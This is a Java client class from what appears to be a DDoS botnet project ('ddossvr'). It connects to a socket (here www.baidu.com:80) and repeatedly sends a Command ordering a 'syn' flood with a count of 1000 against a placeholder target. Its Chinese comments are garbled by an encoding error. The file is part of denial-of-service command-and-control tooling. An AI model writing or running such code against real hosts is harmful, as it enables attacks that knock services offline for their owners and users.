package com.ec.ddossvr;


import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

import com.ec.ddossvr.model.Command;
import com.ec.ddossvr.model.CommandCode;
import com.ec.ddossvr.service.impl.CommandServiceSYN;
import com.ec.ddossvr.service.impl.CommandServiceSYN.SYN;

public class SocketClient {
    // ��ͻ���
    public static void main(String[] args) throws IOException {
    	for(int i=0;i<1;i++){
        try {
            // 1�������ͻ���Socket��ָ����������ַ�Ͷ˿�
            // Socket socket=new Socket("127.0.0.1",5200);
            Socket socket = new Socket("www.baidu.com", 80);
            System.out.println("�ͻ��������ɹ�");
            // 2����ȡ���������������˷�����Ϣ
            // �򱾻���52000�˿ڷ����ͻ�����
            BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
            // ��ϵͳ��׼�����豸����BufferedReader����
            PrintWriter write = new PrintWriter(socket.getOutputStream());
            // ��Socket����õ��������������PrintWriter����
            //3����ȡ������������ȡ�������˵���Ӧ��Ϣ 
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            // ��Socket����õ�����������������Ӧ��BufferedReader����
            String readline;
            readline = br.readLine(); // ��ϵͳ��׼�������һ�ַ���
            while (!readline.equals("end")) {
                // ���ӱ�׼���������ַ���Ϊ "end"��ֹͣѭ��
            	Command syn=new Command();
            	syn.setAttackCommand(CommandCode.START.getValue());
            	syn.setAttackType("syn");
            	syn.setAttackCount(1000L);
             
            	 
            	
            	CommandServiceSYN.SYN data=new SYN("xxxxx",33);
            	
            	syn.setAttackInfo(data);
            	System.err.println(syn.toString());
            	write.println(syn.toString());
                
                // ����ϵͳ��׼���������ַ��������Server
                write.flush();
                // ˢ���������ʹServer�����յ����ַ���
                System.out.println("Client:" + readline);
                // ��ϵͳ��׼����ϴ�ӡ������ַ���
                System.out.println("Server:" + in.readLine());
                // ��Server����һ�ַ���������ӡ����׼�����
                readline = br.readLine(); // ��ϵͳ��׼�������һ�ַ���
            } // ����ѭ��
            //4���ر���Դ 
            write.close(); // �ر�Socket�����
            in.close(); // �ر�Socket������
            socket.close(); // �ر�Socket
        } catch (Exception e) {
            System.out.println("can not listen to:" + e);// ������ӡ������Ϣ
        }
    	}
    }

}